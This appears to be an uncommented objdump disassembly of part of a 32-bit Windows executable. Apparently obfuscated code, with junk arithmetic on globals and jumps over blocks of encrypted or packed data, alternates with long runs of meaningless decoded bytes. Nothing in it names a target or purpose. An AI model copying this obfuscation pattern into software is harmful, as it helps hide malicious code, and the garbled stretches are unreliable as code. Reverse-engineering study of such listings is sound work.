  40b31a:	add    BYTE PTR [ebx-0x17ffbd7e],ah
  40b320:	cld    
  40b321:	mov    eax,0x351b0000
  40b326:	xchg   edi,eax
  40b327:	add    BYTE PTR [edx+0x0],0x8b
  40b32b:	dec    ebp
  40b32c:	loopne 0x40b2af
  40b32e:	(bad)  
  40b32f:	xchg   BYTE PTR [ecx],ch
  40b331:	add    BYTE PTR [eax],al
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42822b,0x4282eb
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428383,0x4282eb
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42836b,0x42825f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42839f,0x42823f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42829f
  40b386:	adc    DWORD PTR ds:0x428193,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428307,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428273,0x42825f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42816b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428387,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428167,0x42839b
  40b3c4:	call   0x42206a
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42826b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42829b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428283,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42831b
  40b3f3:	mov    eax,ds:0x428293
  40b3f8:	cmp    DWORD PTR ds:0x42829b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428edc
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42818b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42827b
  40b422:	or     DWORD PTR ds:0x42830b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428167,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428393,0x0
  40b441:	mov    DWORD PTR ds:0x42830b,ecx
  40b447:	mov    DWORD PTR ds:0x42838b,0x318c
  40b451:	mov    DWORD PTR ds:0x42839b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428263,0x461b
  40b46a:	mov    DWORD PTR ds:0x42829f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428393,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ee0
  40b48f:	xor    edx,DWORD PTR ds:0x428273
  40b495:	adc    ecx,DWORD PTR ds:0x42837b
  40b49b:	and    DWORD PTR ds:0x42816b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42827f
  40b4b7:	xor    DWORD PTR ds:0x428393,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428263
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42817f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42815b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42822b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282a7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42817f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fd3
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428dc8
  40b528:	sbb    DWORD PTR ds:0x428297,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281cf
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283bb
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42819b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428243
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428273
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282a3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42837b,0x428243
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xffffffd6
  40b596:	addr16 xor eax,0x18130a6a
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	(bad)  
  40b5a2:	sub    BYTE PTR [edx+0x26],bh
  40b5a5:	(bad)  ds:0x1457e8fc
  40b5ab:	mov    fs,esi
  40b5ad:	repnz xor BYTE PTR [ebp+ebx*1+0xc499c65],0x18
  40b5b6:	js     0x40b636
  40b5b8:	in     al,0x38
  40b5ba:	jmp    0x48c328cd
  40b5bf:	fisttp QWORD PTR ds:0xfb66a975
  40b5c5:	push   ebx
  40b5c6:	in     al,0x7b
  40b5c8:	imul   eax,edx,0xfffffff9
  40b5cb:	aas    
  40b5cc:	and    ecx,DWORD PTR [edi]
  40b5ce:	jo     0x40b5e9
  40b5d0:	loopne 0x40b5d1
  40b5d2:	sub    eax,0x53b34d7
  40b5d7:	or     al,0xad
  40b5d9:	sbb    DWORD PTR [edx-0x2b26efb7],edx
  40b5df:	sub    al,0x58
  40b5e1:	clc    
  40b5e2:	mov    bh,0x83
  40b5e4:	and    esp,DWORD PTR [eax]
  40b5e6:	adc    eax,0xb7d88910
  40b5eb:	mov    ecx,DWORD PTR [eax-0x4439610e]
  40b5f1:	popf   
  40b5f2:	or     al,0x6c
  40b5f4:	(bad)  
  40b5f5:	mov    eax,ds:0x52158577
  40b5fa:	cmc    
  40b5fb:	imul   BYTE PTR [eax]
  40b5fd:	cmp    eax,0x1d6ce38c
  40b602:	callw  0xe663
  40b606:	repnz xchg ebp,eax
  40b608:	jp     0x40b5c0
  40b60a:	scas   eax,DWORD PTR es:[edi]
  40b60b:	add    ah,BYTE PTR [ebp-0x1a]
  40b60e:	pcmpgtb mm4,mm5
  40b611:	sbb    bl,ch
  40b613:	mov    esp,0x5807c628
  40b618:	mov    edx,0xf69fffab
  40b61d:	ins    DWORD PTR es:[edi],dx
  40b61e:	or     BYTE PTR ds:0x7653af6c,ah
  40b624:	xchg   ecx,eax
  40b625:	pop    ebp
  40b626:	add    DWORD PTR [ebp+0x70],0xffffffa7
  40b62a:	ret    0x6c71
  40b62d:	xchg   ebp,eax
  40b62e:	(bad)  
  40b630:	jae    0x40b667
  40b632:	popf   
  40b633:	inc    ecx
  40b634:	int    0xab
  40b636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b637:	pop    ss
  40b638:	and    BYTE PTR [edi-0x1f],0xb6
  40b63c:	jmp    0x40b60e
  40b63e:	push   es
  40b63f:	xlat   BYTE PTR ds:[ebx]
  40b640:	jg     0x40b6b2
  40b642:	lock xchg ebx,eax
  40b644:	xor    dl,BYTE PTR [edx]
  40b646:	pop    ecx
  40b647:	lea    edx,[eax+0x2a]
  40b64a:	cdq    
  40b64b:	mov    ds:0x11ec52aa,al
  40b650:	push   ebx
  40b651:	(bad)  
  40b652:	test   eax,0xa2ea053a
  40b657:	pop    edi
  40b658:	icebp  
  40b659:	aad    0xa2
  40b65b:	scas   al,BYTE PTR es:[edi]
  40b65c:	loope  0x40b66e
  40b65e:	add    edx,DWORD PTR [esi-0xe]
  40b661:	imul   eax,DWORD PTR [ebx-0x10d31b32],0xffffffeb
  40b668:	add    BYTE PTR [ebp-0x56],dl
  40b66b:	cwde   
  40b66c:	dec    ebx
  40b66d:	stos   BYTE PTR es:[edi],al
  40b66e:	pop    edi
  40b66f:	repz cs iret 
  40b672:	(bad)  
  40b673:	clc    
  40b674:	jne    0x40b64c
  40b676:	push   ebp
  40b677:	and    DWORD PTR [ecx],edx
  40b679:	sbb    esp,ebp
  40b67b:	cmc    
  40b67c:	sub    BYTE PTR [ecx],0xb9
  40b67f:	out    0x48,eax
  40b681:	dec    esp
  40b682:	jg     0x40b658
  40b684:	push   cs
  40b685:	push   ss
  40b686:	push   edx
  40b687:	mov    ds:0xeefdc5a5,eax
  40b68c:	xor    DWORD PTR [ecx],edi
  40b68e:	adc    DWORD PTR [ecx-0x57],ebp
  40b691:	(bad)  
  40b692:	adc    al,0xf0
  40b694:	mov    eax,0x5e87c20e
  40b699:	fdiv   QWORD PTR [esi+0x35]
  40b69c:	les    ebp,FWORD PTR [ebp-0x70]
  40b69f:	mov    ecx,0xc9d95953
  40b6a4:	mov    ds:0xca12dcec,eax
  40b6a9:	push   edx
  40b6aa:	js     0x40b644
  40b6ac:	pop    esp
  40b6ad:	sti    
  40b6ae:	out    dx,eax
  40b6af:	shl    DWORD PTR [ebp+0x41],0x72
  40b6b3:	or     edx,0xecf5efde
  40b6b9:	inc    ecx
  40b6ba:	jo     0x40b6bc
  40b6bc:	ins    BYTE PTR es:[edi],dx
  40b6bd:	add    edi,DWORD PTR [edi+0x6725c34b]
  40b6c3:	clc    
  40b6c4:	ret    0x9c21
  40b6c7:	mov    ah,0x80
  40b6c9:	xchg   DWORD PTR [esi+0x5a],ebx
  40b6cc:	ror    BYTE PTR [ecx-0x1039ab05],1
  40b6d2:	stc    
  40b6d3:	fcmove st,st(2)
  40b6d5:	mov    cl,BYTE PTR [ecx]
  40b6d7:	sub    al,0xec
  40b6d9:	dec    edi
  40b6da:	mov    ds:0x5ab48e2b,al
  40b6df:	xor    DWORD PTR [eax],0x7b
  40b6e2:	mov    ?,WORD PTR [edi-0x7b]
  40b6e5:	sub    ch,BYTE PTR [edi-0x2431634c]
  40b6eb:	jg     0x40b6a1
  40b6ed:	push   es
  40b6ee:	scas   al,BYTE PTR es:[edi]
  40b6ef:	(bad)  
  40b6f0:	(bad)  
  40b6f2:	mov    al,ds:0x251ea10
  40b6f7:	out    0x3d,eax
  40b6f9:	xor    eax,0x4aa22d62
  40b6fe:	fs inc ebx
  40b700:	dec    esp
  40b701:	add    BYTE PTR [ebx],bh
  40b703:	mov    ch,0x22
  40b705:	adc    BYTE PTR [ecx],bh
  40b707:	push   edx
  40b708:	mov    ch,0xcd
  40b70a:	or     ebp,DWORD PTR [edx]
  40b70c:	jmp    0x40b6cc
  40b70e:	add    BYTE PTR [esi],0x5e
  40b711:	push   ss
  40b712:	cwde   
  40b713:	es cdq 
  40b715:	jl     0x40b6fc
  40b717:	lock pop esi
  40b719:	jle    0x40b6aa
  40b71b:	cmp    BYTE PTR [esi],bl
  40b71d:	outs   dx,BYTE PTR ds:[esi]
  40b71e:	push   esi
  40b71f:	lds    ebx,FWORD PTR [eax]
  40b721:	ret    
  40b722:	xchg   ebx,eax
  40b723:	sti    
  40b724:	xor    BYTE PTR [ecx+ecx*2+0x22],bl
  40b728:	dec    edx
  40b729:	jmp    0x9e7633fd
  40b72e:	mov    dl,0xec
  40b730:	es fwait
  40b732:	pop    ss
  40b733:	mov    WORD PTR [ebx],?
  40b735:	jle    0x40b762
  40b737:	sbb    al,0x8c
  40b739:	in     eax,0x55
  40b73b:	scas   eax,DWORD PTR es:[edi]
  40b73c:	xor    eax,0x224cbac1
  40b741:	or     edx,DWORD PTR [edi+ebx*1+0x78]
  40b745:	rol    DWORD PTR [edx-0xac1306e],0xe7
  40b74c:	dec    ebx
  40b74d:	push   eax
  40b74e:	sub    al,0xa
  40b750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b751:	repz jnp 0x40b79d
  40b754:	xchg   esp,eax
  40b755:	inc    DWORD PTR [ebp+0x76]
  40b758:	fisub  DWORD PTR [eax-0x261805e1]
  40b75e:	call   0x36a0:0x63d7ed02
  40b765:	bound  bp,DWORD PTR [esp+ebp*2-0x2a]
  40b76a:	test   esp,0x8051d984
  40b770:	fadd   DWORD PTR [ecx-0x352b8c9e]
  40b776:	inc    edi
  40b777:	adc    edi,ebx
  40b779:	inc    esi
  40b77a:	pusha  
  40b77b:	(bad)  
  40b77c:	ins    DWORD PTR es:[edi],dx
  40b77d:	sbb    DWORD PTR [edi],edx
  40b77f:	jns    0x40b773
  40b781:	or     eax,0x53eced1
  40b786:	and    BYTE PTR [eax],dl
  40b788:	pusha  
  40b789:	push   0xffffffe9
  40b78b:	fnstcw WORD PTR [edi]
  40b78d:	xchg   ecx,eax
  40b78e:	and    al,0x4f
  40b790:	mov    ss,WORD PTR [ecx+0x6a24b60d]
  40b796:	bound  ecx,QWORD PTR es:[ebp+0x8]
  40b79a:	nop
  40b79b:	in     eax,0x16
  40b79d:	inc    DWORD PTR [edi]
  40b79f:	clc    
  40b7a0:	or     DWORD PTR [eax-0x376dfb58],esp
  40b7a6:	(bad)  
  40b7a7:	jne    0x40b73c
  40b7a9:	leave  
  40b7aa:	add    BYTE PTR [ebx],0xed
  40b7ad:	mov    BYTE PTR [edi+0x59],ch
  40b7b0:	mov    edi,DWORD PTR [ebp+0x2a70f548]
  40b7b6:	inc    edx
  40b7b7:	(bad)  
  40b7b8:	cli    
  40b7b9:	bound  esi,QWORD PTR [esp+esi*2+0xa347709]
  40b7c0:	aam    0xf9
  40b7c2:	cwde   
  40b7c3:	imul   edi,DWORD PTR [edi],0xffffffa9
  40b7c6:	pop    es
  40b7c7:	repnz loope 0x40b806
  40b7ca:	cmc    
  40b7cb:	repnz add BYTE PTR [ebp+0xf348c53],ch
  40b7d2:	jns    0x40b7df
  40b7d4:	or     BYTE PTR [edx-0x70],dl
  40b7d7:	or     DWORD PTR [eax+0x1d],0x11dd61e8
  40b7de:	pop    edx
  40b7df:	jge    0x40b7d2
  40b7e1:	mov    al,0xf7
  40b7e3:	sbb    esp,DWORD PTR ds:0xbb2a5766
  40b7e9:	cli    
  40b7ea:	xor    dh,0x5b
  40b7ed:	ins    BYTE PTR es:[edi],dx
  40b7ee:	or     BYTE PTR [eax-0x6f8f9c71],0x96
  40b7f5:	jno    0x40b844
  40b7f7:	out    dx,eax
  40b7f8:	jecxz  0x40b808
  40b7fa:	sub    BYTE PTR [esi+0x3c],dh
  40b7fd:	jne    0x40b790
  40b7ff:	je     0x40b7b0
  40b801:	sub    bh,BYTE PTR [ecx-0x3b]
  40b804:	adc    bl,bl
  40b806:	ret    
  40b807:	in     eax,dx
  40b808:	sub    eax,esi
  40b80a:	xchg   ebp,ecx
  40b80c:	out    dx,al
  40b80d:	cmp    dh,bl
  40b80f:	push   edi
  40b810:	and    DWORD PTR [ebx-0x60],0xa1289bd1
  40b817:	mov    ch,0x1d
  40b819:	les    eax,FWORD PTR [ebx]
  40b81b:	add    al,0x1b
  40b81d:	adc    al,0xa5
  40b81f:	sub    eax,0x70298576
  40b824:	xchg   esp,eax
  40b825:	dec    edx
  40b826:	jno    0x40b7d3
  40b828:	pop    eax
  40b829:	mov    ah,0x7b
  40b82b:	repnz mov esp,0xcb77c329
  40b831:	clc    
  40b832:	mov    ds:0x1fac81a7,eax
  40b837:	(bad)  [edi]
  40b839:	add    BYTE PTR [edx-0x74],dl
  40b83c:	rcr    BYTE PTR [eax+0x7ecbbee7],1
  40b842:	mov    bl,0x93
  40b844:	push   0x9e65628f
  40b849:	sti    
  40b84a:	and    dh,BYTE PTR [ecx-0x7f]
  40b84d:	shl    BYTE PTR [ebp+ecx*2+0x5d],cl
  40b851:	pushf  
  40b852:	dec    esp
  40b853:	mov    esi,0xc5f1f521
  40b858:	cmp    bl,BYTE PTR [ebx+0x19]
  40b85b:	cs mov ebp,0x3f3fb7d0
  40b861:	daa    
  40b862:	dec    ebx
  40b863:	jg     0x40b8c8
  40b865:	xlat   BYTE PTR ds:[ebx]
  40b866:	sti    
  40b867:	scas   al,BYTE PTR es:[edi]
  40b868:	mov    BYTE PTR ss:0xfc1fed74,cl
  40b86f:	(bad)  
  40b870:	mov    eax,ds:0xa20aabba
  40b875:	into   
  40b876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b878:	mov    bh,BYTE PTR [ebp+0x25]
  40b87b:	stc    
  40b87c:	pop    esp
  40b87d:	addr16 in al,0x7f
  40b880:	inc    edx
  40b881:	repz jmp 0xce870fd2
  40b887:	vminsd xmm6,xmm0,QWORD PTR ds:0x61df95d2
  40b88f:	xchg   ebp,eax
  40b890:	imul   DWORD PTR [esi+0x58]
  40b893:	adc    bl,BYTE PTR [ebx-0x61]
  40b896:	in     al,dx
  40b897:	push   ds
  40b898:	or     eax,0x8c0062e6
  40b89d:	push   esp
  40b89e:	push   ss
  40b89f:	mov    dl,0xcb
  40b8a1:	clc    
  40b8a2:	lock fsub QWORD PTR [ebp+0x1a0daa13]
  40b8a9:	sbb    eax,0xe188a8cf
  40b8ae:	lds    edx,FWORD PTR [ebx+0x55]
  40b8b1:	scas   al,BYTE PTR es:[edi]
  40b8b2:	inc    ebp
  40b8b3:	pop    ebx
  40b8b4:	out    dx,al
  40b8b5:	jge    0x40b841
  40b8b7:	ss das 
  40b8b9:	scas   eax,DWORD PTR es:[edi]
  40b8ba:	xchg   ebp,eax
  40b8bb:	xor    al,0x2f
  40b8bd:	pop    eax
  40b8be:	icebp  
  40b8bf:	jge    0x40b894
  40b8c1:	mov    gs,WORD PTR [eax+eax*8+0x4a77c08f]
  40b8c8:	ret    0xca63
  40b8cb:	xor    al,0x2e
  40b8cd:	outs   dx,DWORD PTR ds:[esi]
  40b8ce:	dec    edx
  40b8cf:	hlt    
  40b8d0:	inc    esp
  40b8d1:	popa   
  40b8d2:	in     eax,dx
  40b8d3:	cdq    
  40b8d4:	cmp    BYTE PTR [esi-0x45],0x22
  40b8d8:	mov    ch,0xd1
  40b8da:	pop    eax
  40b8db:	sbb    eax,0x52312bd7
  40b8e0:	fstp   DWORD PTR [ebx]
  40b8e2:	inc    edx
  40b8e3:	mov    dl,0xd3
  40b8e5:	xchg   esp,eax
  40b8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e7:	sbb    esi,DWORD PTR [ecx]
  40b8e9:	enter  0x8b3c,0xe7
  40b8ed:	cmp    bh,ch
  40b8ef:	push   0x6db2aba1
  40b8f4:	mov    bh,0xb5
  40b8f6:	jnp    0x40b938
  40b8f8:	xchg   ebx,eax
  40b8f9:	test   al,0xde
  40b8fb:	mov    esp,0xe20592e9
  40b900:	jns    0x40b91c
  40b902:	ror    BYTE PTR [esi-0x71b4cb7a],0x28
  40b909:	jno    0x40b907
  40b90b:	sub    DWORD PTR [esi],edx
  40b90d:	test   bh,ah
  40b90f:	ficomp WORD PTR [ebx-0x51d2a13b]
  40b915:	cmp    eax,0x4039f95f
  40b91a:	mov    ?,eax
  40b91c:	mov    dl,0xf8
  40b91e:	sbb    al,0xaa
  40b920:	inc    ebp
  40b921:	test   al,0x7
  40b923:	mov    eax,ds:0x61b4e3f
  40b928:	jo     0x40b97f
  40b92a:	mov    ecx,0xf57e57f2
  40b92f:	psrad  mm4,QWORD PTR [edi]
  40b932:	mov    bl,0x3b
  40b934:	cmc    
  40b935:	std    
  40b936:	push   ss
  40b937:	jge    0x40b977
  40b939:	or     BYTE PTR [ebx+0x7d002d1d],ah
  40b93f:	cdq    
  40b940:	(bad)  
  40b941:	or     DWORD PTR ds:0xa903a660,edi
  40b947:	add    al,0x3
  40b949:	xor    ebx,DWORD PTR [ebx+0x5f]
  40b94c:	mov    dh,0x44
  40b94e:	push   es
  40b94f:	or     esp,eax
  40b951:	in     al,dx
  40b952:	jecxz  0x40b8d5
  40b954:	cli    
  40b955:	lock adc bh,BYTE PTR [eax-0x6f]
  40b959:	dec    eax
  40b95a:	cs inc ebx
  40b95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b95d:	lods   al,BYTE PTR ds:[esi]
  40b95e:	(bad)  
  40b95f:	pusha  
  40b960:	jne    0x40b94f
  40b962:	mov    ebx,0xbc6eb44f
  40b967:	or     BYTE PTR [edi],dl
  40b969:	pop    esi
  40b96a:	mov    ch,0x70
  40b96c:	adc    DWORD PTR [edx],eax
  40b96e:	jns    0x40b95e
  40b970:	shl    BYTE PTR [edi-0x1c7306e3],0x99
  40b977:	xchg   edx,eax
  40b978:	out    dx,al
  40b979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b97a:	add    eax,0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x4282f3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428277
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428307,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42830f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428277,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42830f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42839f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42830f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428dcc
  40b9f7:	adc    DWORD PTR ds:0x42839b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282f7
  40ba0a:	sub    edx,DWORD PTR ds:0x42830b
  40ba10:	mov    DWORD PTR ds:0x4282f7,edx
  40ba16:	adc    DWORD PTR ds:0x4282f3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428167
  40ba26:	xor    DWORD PTR ds:0x428393,edx
  40ba2c:	or     DWORD PTR ds:0x42823f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428277
  40ba3c:	or     DWORD PTR ds:0x428313,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	mov    ds:0x60befaf0,eax
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	cdq    
  40bab0:	jl     0x40ba57
  40bab2:	clc    
  40bab3:	add    dh,0x4f
  40bab6:	pop    edx
  40bab7:	cmc    
  40bab8:	ins    DWORD PTR es:[edi],dx
  40bab9:	push   esp
  40baba:	test   al,0xb7
  40babc:	imul   esp,ebp,0x84966687
  40bac2:	mov    edx,0x1cef84ab
  40bac7:	arpl   WORD PTR [esp+ebp*4],ax
  40baca:	mov    esi,DWORD PTR [edx-0x668c5859]
  40bad0:	xor    al,0xe2
  40bad2:	clc    
  40bad3:	pop    ebx
  40bad4:	icebp  
  40bad5:	jb     0x40ba83
  40bad7:	pop    ecx
  40bad8:	inc    edi
  40bad9:	lods   al,BYTE PTR ds:[esi]
  40bada:	xor    BYTE PTR [edx],dh
  40badc:	stos   DWORD PTR es:[edi],eax
  40badd:	js     0x40bb19
  40badf:	repz std 
  40bae1:	push   esi
  40bae2:	popf   
  40bae3:	push   ss
  40bae4:	mov    ebp,DWORD PTR [ebp-0x474edde5]
  40baea:	sbb    dh,al
  40baec:	daa    
  40baed:	popf   
  40baee:	addr16 xchg esi,eax
  40baf0:	js     0x40bb19
  40baf2:	not    DWORD PTR [eax-0x33]
  40baf5:	and    ecx,ecx
  40baf7:	ins    BYTE PTR es:[edi],dx
  40baf8:	jmp    0x40bb3f
  40bafa:	inc    esp
  40bafb:	icebp  
  40bafc:	mov    ebp,eax
  40bafe:	or     BYTE PTR [eax-0x6994cbe3],bh
  40bb04:	pop    ebx
  40bb05:	test   dl,cl
  40bb07:	leave  
  40bb08:	aam    0xb3
  40bb0a:	aam    0x33
  40bb0c:	in     al,0x20
  40bb0e:	sti    
  40bb0f:	nop
  40bb10:	cmp    DWORD PTR [edi-0x12],esp
  40bb13:	push   edi
  40bb14:	mov    cl,0x88
  40bb16:	mov    dh,0xc0
  40bb18:	lea    eax,[ebx+eax*4]
  40bb1b:	outs   dx,BYTE PTR ds:[esi]
  40bb1c:	dec    eax
  40bb1d:	jo     0x40bb2e
  40bb1f:	mov    bh,0xb2
  40bb21:	les    ebp,FWORD PTR [ebx-0x24]
  40bb24:	and    edi,DWORD PTR [esi-0x7989dde4]
  40bb2a:	hlt    
  40bb2b:	push   esi
  40bb2c:	cli    
  40bb2d:	push   ebx
  40bb2e:	out    dx,eax
  40bb2f:	sbb    ah,ah
  40bb31:	dec    esp
  40bb32:	neg    bh
  40bb34:	push   0xfffffffd
  40bb36:	xchg   esp,eax
  40bb37:	fucom  st(6)
  40bb39:	xor    al,BYTE PTR [ebp+0xcf89479]
  40bb3f:	mov    ?,WORD PTR [esi+0x7fdc11d6]
  40bb45:	dec    ebp
  40bb46:	icebp  
  40bb47:	ins    DWORD PTR es:[edi],dx
  40bb48:	pop    edx
  40bb49:	leave  
  40bb4a:	popf   
  40bb4b:	jge    0x40bb5b
  40bb4d:	aam    0xc5
  40bb4f:	push   es
  40bb50:	push   cs
  40bb51:	push   esp
  40bb52:	xchg   ebx,eax
  40bb53:	ds icebp 
  40bb55:	(bad)  
  40bb56:	aad    0xf2
  40bb58:	sbb    ecx,eax
  40bb5a:	mov    dh,0xfd
  40bb5c:	pusha  
  40bb5d:	pop    ecx
  40bb5e:	ss push eax
  40bb60:	test   edi,ebp
  40bb62:	inc    esp
  40bb63:	and    al,0xc0
  40bb65:	es mov dl,0x18
  40bb68:	outs   dx,DWORD PTR es:[esi]
  40bb6a:	leave  
  40bb6b:	mov    bh,0x83
  40bb6d:	mov    cl,0x98
  40bb6f:	int3   
  40bb70:	out    0x5,eax
  40bb72:	mov    ds:0xaa3704f2,eax
  40bb77:	mov    ds:0x2556470,eax
  40bb7c:	sbb    ebx,DWORD PTR [ebx-0x54]
  40bb7f:	(bad)  
  40bb81:	test   eax,0xdcc0bd8c
  40bb86:	mov    bh,bh
  40bb88:	jp     0x40bb96
  40bb8a:	add    al,0x11
  40bb8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb8d:	das    
  40bb8e:	pop    esi
  40bb8f:	mov    bh,0xd
  40bb91:	fsub   DWORD PTR [ebx+edi*8+0x60243ec3]
  40bb98:	addr16 mov ch,0x16
  40bb9b:	cmp    ecx,edx
  40bb9d:	xchg   ebp,eax
  40bb9e:	icebp  
  40bb9f:	lods   al,BYTE PTR ds:[esi]
  40bba0:	push   ebp
  40bba1:	call   0x37a4:0xcec0eeb
  40bba8:	sub    al,0x1
  40bbaa:	jne    0x40bba4
  40bbac:	pop    esp
  40bbad:	lds    edi,FWORD PTR [ebx+ebx*8+0x36]
  40bbb1:	jbe    0x40bb54
  40bbb3:	mov    ds:0x39ca254,eax
  40bbb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbb9:	std    
  40bbba:	mov    BYTE PTR [esi+0x9],bl
  40bbbd:	pusha  
  40bbbe:	fwait
  40bbbf:	adc    edi,DWORD PTR [ecx]
  40bbc1:	sbb    eax,0x73cdc1af
  40bbc6:	aas    
  40bbc7:	pop    esp
